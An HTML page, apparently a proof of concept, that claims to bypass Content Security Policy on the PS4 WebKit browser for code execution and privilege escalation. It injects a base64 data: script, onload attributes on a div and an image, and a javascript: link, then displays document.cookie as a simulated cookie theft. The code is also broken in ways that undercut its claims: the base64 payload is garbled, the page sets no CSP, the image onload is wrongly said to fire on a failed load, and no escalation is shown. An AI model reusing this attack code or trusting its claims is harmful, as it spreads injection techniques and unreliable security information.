<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit CSP Bypass Privilege Escalation POC</title>
</head>
<body>
    <h1>PS4 WebKit CSP Bypass Privilege Escalation POC</h1>
    <div id="output"></div>

    <script>
        async function triggerCSPBypassForCodeExecution() {
            const outputDiv = document.getElementById('output');
            outputDiv.innerHTML += "<h2>Iniciando PoC de Escalada de Privilégios via Bypass de CSP...</h2>";

            outputDiv.innerHTML += "<p><strong>Tentando Bypass de CSP via data: URI...</strong></p>";
            const script1 = document.createElement('script');
            script1.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gYmF5cGFzcyBkbyBDU1AhIEV4ZWN1dYW5kbyBjb2RpZ28gYXJiaXRywWrioScpOw=='; // alert('Vupun bypass do CSP! Executando código arbitrário!');
            script1.onload = function() {
                outputDiv.innerHTML += "<p><strong style='color: green;'>Bypass de CSP via data: URI BEM-SUCEDIDO! Código arbitrário executado (alerta exibido).</strong></p>";
                // Aqui, código mais malicioso poderia ser injetado, como roubo de cookies, etc.
                outputDiv.innerHTML += "<p>Simulando ação maliciosa (roubo de cookie)...</p>";
                const fakeCookie = document.cookie; // Tentativa de acessar cookies (pode ser restrito)
                outputDiv.innerHTML += `<p>Cookie roubado (simulado): ${fakeCookie}</p>`;
            };
            script1.onerror = function() {
                outputDiv.innerHTML += "<p><strong style='color: orange;'>Falha ao bypassar o CSP via data: URI (inesperado).</strong></p>";
            };
            document.body.appendChild(script1);

            await new Promise(resolve => setTimeout(resolve, 1000)); // Dar tempo para a execução

            outputDiv.innerHTML += "<p><strong>Tentando Bypass de CSP via atributo onload...</strong></p>";
            const div2 = document.createElement('div');
            div2.setAttribute('onload', 'alert(\'Vupun bypass do CSP via onload!\');');
            document.body.appendChild(div2);
            outputDiv.innerHTML += "<p>Elemento div com atributo onload injetado.</p>";

            // Para garantir a execução do onload, o elemento precisa ser "carregado" ou interagido (dependendo do tipo)
            // No caso de um div, pode não disparar automaticamente. Para elementos como img, sim.
            // Para esta PoC, o alerta pode não aparecer imediatamente dependendo do comportamento do navegador.

            // Uma forma mais confiável com onload seria com uma imagem:
            const img3 = document.createElement('img');
            img3.setAttribute('onload', 'alert(\'Vupun bypass do CSP via onload em imagem!\');');
            img3.src = 'invalid-image.jpg'; // Forçar um "carregamento" (falha) para disparar onload
            document.body.appendChild(img3);
            outputDiv.innerHTML += "<p>Elemento img com atributo onload injetado (forçando carregamento).</p>";

            await new Promise(resolve => setTimeout(resolve, 1000));

            outputDiv.innerHTML += "<p><strong>Tentando Bypass de CSP via javascript: URI em atributo de evento...</strong></p>";
            const a4 = document.createElement('a');
            a4.href = 'javascript:alert(\'Vupun bypass do CSP via javascript URI!\');';
            a4.textContent = 'Clique aqui para bypassar o CSP (javascript: URI)';
            document.body.appendChild(a4);
            outputDiv.innerHTML += "<p>Link com javascript: URI injetado.</p>";
            // Nota: A execução deste bypass requer interação do usuário (clicar no link).

        }

        document.addEventListener('DOMContentLoaded', triggerCSPBypassForCodeExecution);
    </script>

    <noscript><p><strong style='color: red;'>JavaScript está desabilitado. A PoC não funcionará corretamente.</strong></p></noscript>
</body>
</html>
